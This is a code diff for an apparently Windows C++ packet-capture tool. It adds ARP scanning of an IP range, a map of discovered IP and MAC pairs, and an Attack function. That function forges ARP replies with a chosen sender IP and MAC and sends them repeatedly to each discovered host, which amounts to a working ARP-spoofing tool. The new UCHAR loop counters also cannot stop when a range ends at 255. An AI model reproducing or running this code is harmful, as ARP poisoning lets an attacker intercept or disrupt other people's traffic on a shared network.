@@ -117,6 +117,20 @@ VOID CALLBACK GetRawPacket(HWND hwnd, UINT msg, UINT_PTR timeid, DWORD systemtim
 	}
 	InitListInfo(Info, &ListViewInfo);
 	ChangeListInfoMap(CurrentNum, Info, FALSE);
+	if (Info.Type == INFO_ARP && Tranverse16(Info.protocol.Arp.opcode) == ARP_REPLY)
+	{
+		vector<UCHAR> Iptemp;
+		vector<UCHAR> Mactemp;
+		for (UCHAR temp : Info.protocol.Arp.saddr)
+		{
+			Iptemp.push_back(temp);
+		}
+		for (UCHAR temp : Info.protocol.Arp.smac)
+		{
+			Mactemp.push_back(temp);
+		}
+		ScanIpMac[Iptemp] = Mactemp;
+	}
 	AddListView(&ListViewInfo);
 }
 void StartFilter(HWND hDlg)
@@ -137,27 +151,7 @@ void StopFilter(HWND hDlg)
 }
 void FindCard(HWND hDlg)
 {
-	LVCOLUMN lvColumn;
-	lvColumn.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT | LVCF_SUBITEM;
-	lvColumn.fmt = LVCFMT_LEFT;
-	lvColumn.cx = 150;
 	HWND hList = GetDlgItem(hDlg, IDC_CARDLIST);
-	SetWindowLong(hList, GWL_STYLE,
-		WS_TABSTOP | WS_CHILD | WS_BORDER | WS_VISIBLE | LVS_REPORT | LVS_SINGLESEL | LVS_SHOWSELALWAYS);
-	TCHAR       szString[4][20] = { TEXT("NetCardName"),
-		TEXT("Mac"),
-		TEXT("DevPathName"),
-		TEXT("IsFiltering") };
-	for (int i = 0; i < 4; i++)
-	{
-		lvColumn.pszText = szString[i];
-		if (i == 2)
-		{
-			lvColumn.cx = 200;
-		}
-		ListView_InsertColumn(hList, i, &lvColumn);
-	}
-
 	FilterHandle = Net_OpenFilter();
 	IO_Packet NetWorkAdapterInfo = { 0 };
 	Net_ShowAdapter(FilterHandle, &NetWorkAdapterInfo);
@@ -277,7 +271,7 @@ void ChangeListInfoMap(int index, PacketInfo Info,BOOLEAN Deleted)
 		}
 	}
 }
-void ShowRawData(HWND hDlg,int Index)
+void ShowRawData(HWND hDlg,int Index)				
 {
 	PacketInfo Info = ListInfo[Index];
 	int Bufsize = Info.Size * 5;
@@ -294,7 +288,7 @@ void ShowRawData(HWND hDlg,int Index)
 	free(Buf);
 }
 
-void PrintChar(int i,char *Buf,int Num,PacketInfo Info,int Bufsize)
+void PrintChar(int i,char *Buf,int Num,PacketInfo Info,int Bufsize)      //不导出
 {
 	char temp[10] = { 0 };
 	strcat_s(Buf, Bufsize, "\t\t");
@@ -313,7 +307,7 @@ void PrintChar(int i,char *Buf,int Num,PacketInfo Info,int Bufsize)
 	}
 	strcat_s(Buf, Bufsize, "\r\n");
 }
-void ShowAnalysisData(HWND hDlg, int Index)
+void ShowAnalysisData(HWND hDlg, int Index)                          //不导出
 {
 	char temp[10] = { 0 };
 	PacketInfo Info = ListInfo[Index];
@@ -356,6 +350,7 @@ void StartScan(HWND hDlg)
 	UCHAR SourceAddr[4] = { 0 };
 	UCHAR* Mac;
 	
+	/*ScanIpMac.clear();*/
 	HWND HIpStart = GetDlgItem(hDlg, IDC_IPSTART);
 	HWND HIpEnd = GetDlgItem(hDlg, IDC_IPEND);
 	HWND HSip = GetDlgItem(hDlg, IDC_LOCALIP);
@@ -399,15 +394,13 @@ void StartScan(HWND hDlg)
 	Packet.Osi.protocol.Arp.opcode = Tranverse16(ARP_REQUEST);
 	RtlCopyMemory(Packet.Osi.protocol.Arp.smac, Mac, sizeof(Packet.Osi.Mac.sou));
 	RtlCopyMemory(Packet.Osi.protocol.Arp.saddr, SourceAddr, sizeof(SourceAddr));
-	/*UCHAR daddr[4] = { 192,168,1,1 };        //想要获取MAC地址的IP
-	RtlCopyMemory(Packet.Osi.protocol.Arp.daddr, daddr, sizeof(daddr));*/
-	for (int a = IpStart[0]; a <= IpEnd[0]; a++)
+	for (UCHAR a = IpStart[0]; a <= IpEnd[0]; a++)
 	{
-		for (int b = IpStart[1];  b<= IpEnd[1]; b++)
+		for (UCHAR b = IpStart[1];  b<= IpEnd[1]; b++)
 		{
-			for (int c = IpStart[2]; c <= IpEnd[2]; c++)
+			for (UCHAR c = IpStart[2]; c <= IpEnd[2]; c++)
 			{
-				for (int d = IpStart[3]; d <= IpEnd[3]; d++)
+				for (UCHAR d = IpStart[3]; d <= IpEnd[3]; d++)
 				{
 					UCHAR DestAddr[4] = { a,b,c,d };
 					RtlCopyMemory(Packet.Osi.protocol.Arp.daddr, DestAddr, sizeof(DestAddr));
@@ -416,15 +409,131 @@ void StartScan(HWND hDlg)
 			}
 		}
 	}
-	/*for (int i = 0; i < 255; i++)
-	{
-		UCHAR daddr[4] = { 192,168,1,i };        //想要获取MAC地址的IP
-		RtlCopyMemory(Packet.Osi.protocol.Arp.daddr, daddr, sizeof(daddr));
-		Net_SendRawPacket(FilterHandle, &Packet, 60, 0);
-	}*/
 }
 
-void Attack(HWND Hdlg)
+BOOL FindIp(vector<UCHAR> Ip,UCHAR *Mac)
 {
+	auto Iter = ScanIpMac.find(Ip);
+	if (Iter != ScanIpMac.end())
+	{
+		int i = 0;
+		for (auto temp : Iter->second)
+		{
+			Mac[i] = temp;
+			i++;
+		}
+		return TRUE;
+	}
+	return FALSE;
+}
 
+void Attack(HWND hDlg)
+{
+	RawPacket Packet = { 0 };
+	UCHAR ApplyIp[4] = { 0 };
+	UCHAR ApplyMac[6] = { 0 };
+	UCHAR IpStart[4] = { 0 };
+	UCHAR IpEnd[4] = { 0 };
+	UCHAR MacTarget[6] = { 0 };
+	int AttackTimes = GetDlgItemInt(hDlg, IDC_TIMES, NULL, FALSE);
+
+	HWND HApplyIp = GetDlgItem(hDlg, IDC_LOCALIP);
+	HWND HIpStart = GetDlgItem(hDlg, IDC_IPSTART);
+	HWND HIpEnd = GetDlgItem(hDlg, IDC_IPEND);
+	DWORD dwAddr;
+	SendMessage(HApplyIp, IPM_GETADDRESS, 0, (LPARAM)&dwAddr);
+	ApplyIp[0] = FIRST_IPADDRESS(dwAddr);
+	ApplyIp[1] = SECOND_IPADDRESS(dwAddr);
+	ApplyIp[2] = THIRD_IPADDRESS(dwAddr);
+	ApplyIp[3] = FOURTH_IPADDRESS(dwAddr);
+	SendMessage(HIpStart, IPM_GETADDRESS, 0, (LPARAM)&dwAddr);
+	IpStart[0] = FIRST_IPADDRESS(dwAddr);
+	IpStart[1] = SECOND_IPADDRESS(dwAddr);
+	IpStart[2] = THIRD_IPADDRESS(dwAddr);
+	IpStart[3] = FOURTH_IPADDRESS(dwAddr);
+	SendMessage(HIpEnd, IPM_GETADDRESS, 0, (LPARAM)&dwAddr);
+	IpEnd[0] = FIRST_IPADDRESS(dwAddr);
+	IpEnd[1] = SECOND_IPADDRESS(dwAddr);
+	IpEnd[2] = THIRD_IPADDRESS(dwAddr);
+	IpEnd[3] = FOURTH_IPADDRESS(dwAddr);
+	ApplyMac[0] = GetDlgItemInt(hDlg, IDC_MAC0, NULL, FALSE);
+	ApplyMac[1] = GetDlgItemInt(hDlg, IDC_MAC1, NULL, FALSE);
+	ApplyMac[2] = GetDlgItemInt(hDlg, IDC_MAC2, NULL, FALSE);
+	ApplyMac[3] = GetDlgItemInt(hDlg, IDC_MAC3, NULL, FALSE);
+	ApplyMac[4] = GetDlgItemInt(hDlg, IDC_MAC4, NULL, FALSE);
+	ApplyMac[5] = GetDlgItemInt(hDlg, IDC_MAC5, NULL, FALSE);
+	RtlCopyMemory(Packet.Osi.Mac.sou, ApplyMac, sizeof(ApplyMac));
+	RtlCopyMemory(Packet.Osi.protocol.Arp.smac, ApplyMac, sizeof(ApplyMac));
+	RtlCopyMemory(Packet.Osi.protocol.Arp.saddr, ApplyIp, sizeof(ApplyIp));
+
+
+	Packet.Osi.Mac.type = Tranverse16(PACKET_ARP);
+	Packet.Osi.protocol.Arp.eth_type = Tranverse16(PACKET_IP);
+	Packet.Osi.protocol.Arp.hrd = Tranverse16(1);
+	Packet.Osi.protocol.Arp.maclen = 6;
+	Packet.Osi.protocol.Arp.iplen = 4;
+	Packet.Osi.protocol.Arp.opcode = Tranverse16(ARP_REPLY);
+	for (int times = 0; times < AttackTimes;times++)
+	{
+		for (UCHAR a = IpStart[0]; a <= IpEnd[0]; a++)
+		{
+			for (UCHAR b = IpStart[1]; b <= IpEnd[1]; b++)
+			{
+				for (UCHAR c = IpStart[2]; c <= IpEnd[2]; c++)
+				{
+					for (UCHAR d = IpStart[3]; d <= IpEnd[3]; d++)
+					{
+						vector<UCHAR> VDestAddr = { a,b,c,d };
+						if (FindIp(VDestAddr, MacTarget))
+						{
+							/*DebugBreak();*/
+							UCHAR DestAddr[4] = { 0 };
+							int num = 0;
+							for (auto temp : VDestAddr)
+							{
+								DestAddr[num] = temp;
+								num++;
+							}
+							RtlCopyMemory(Packet.Osi.protocol.Arp.daddr, DestAddr, sizeof(DestAddr));
+							RtlCopyMemory(Packet.Osi.protocol.Arp.dmac, MacTarget, sizeof(MacTarget));
+							RtlCopyMemory(Packet.Osi.Mac.dst, MacTarget, sizeof(MacTarget));
+							Net_SendRawPacket(FilterHandle, &Packet, ARPPACKETLENGTH, StartIndex);
+						}
+					}
+				}
+			}
+		}
+		Sleep(100);
+	}
+}
+VOID CALLBACK FindAttackTarget(HWND hwnd, UINT msg, UINT_PTR timeid, DWORD systemtime)
+{
+	if (ScanIpMac.size())
+	{
+		HWND TreeView = GetDlgItem(hwnd, IDC_ATTACKLIST);
+		ListView_DeleteAllItems(TreeView);
+		char Ip[20] = { 0 };
+		char Mac[30] = { 0 };
+		for (auto col : ScanIpMac)
+		{
+			sprintf_s(Ip, "%03d.%03d.%03d.%03d", col.first[0], col.first[1], col.first[2], col.first[3]);
+			sprintf(Mac, "%02x-%02x-%02x-%02x-%02x-%02x", col.second[0], col.second[1], col.second[2],
+				col.second[3], col.second[4], col.second[5]);
+
+			LVITEM lvi;
+			ZeroMemory(&lvi, sizeof(lvi));
+			lvi.mask = LVIF_TEXT;//|LVIF_IMAGE; 
+			lvi.cchTextMax = 40;
+			lvi.iSubItem = 0;
+			lvi.pszText = Ip;
+			lvi.iItem = 0;
+
+			int now = ListView_InsertItem(TreeView, &lvi);//
+			ListView_SetItemText(TreeView, now, 1, Mac);
+		}
+	}
+	else
+	{
+		return;
+	}
 }
